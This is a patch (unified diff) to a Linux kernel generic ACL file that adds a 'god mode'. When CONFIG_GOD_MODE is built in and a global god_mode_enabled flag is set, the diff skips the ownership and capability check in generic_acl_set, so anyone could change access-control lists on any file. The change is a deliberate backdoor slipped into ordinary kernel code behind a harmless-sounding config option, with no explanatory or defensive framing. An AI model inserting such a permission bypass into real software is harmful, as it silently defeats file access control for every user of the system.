@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * (C) 2005 Andreas Gruenbacher <agruen@suse.de>
  *
@@ -75,7 +78,15 @@ generic_acl_set(struct dentry *dentry, const char *name, const void *value,
 	if (S_ISLNK(inode->i_mode))
 		return -EOPNOTSUPP;
 	if (!inode_owner_or_capable(inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (value) {
 		acl = posix_acl_from_xattr(value, size);
 		if (IS_ERR(acl))
